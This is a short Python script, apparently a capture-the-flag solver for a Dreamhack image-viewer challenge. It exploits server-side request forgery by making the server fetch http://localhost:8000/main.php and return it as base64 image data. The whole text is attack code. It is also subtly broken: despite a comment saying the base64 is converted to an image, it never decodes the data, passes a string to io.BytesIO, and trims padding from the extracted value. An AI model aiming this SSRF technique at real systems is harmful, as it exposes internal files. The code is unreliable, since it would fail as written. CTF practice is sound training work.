import base64 , requests
import io
import cv2
import numpy as np
from PIL import Image
addr="http://host3.dreamhack.games:12086/"+"img_viewer"
filename="main.php"
data={
    "url":f"http://localhost:8000/{filename}"
}
res=requests.post(url=addr,data=data)
resdata=res.text
pars='<img src="data:image/png;base64, '
start=resdata.find(pars)+len(pars)
end=resdata.find('=="/>')
ret=resdata[start:end]


# base64를 이미지로 변환 
img_out = Image.open(io.BytesIO(ret))
img_out = np.array(img_out)
img_out = cv2.cvtColor(img_out, cv2.COLOR_BGR2RGB)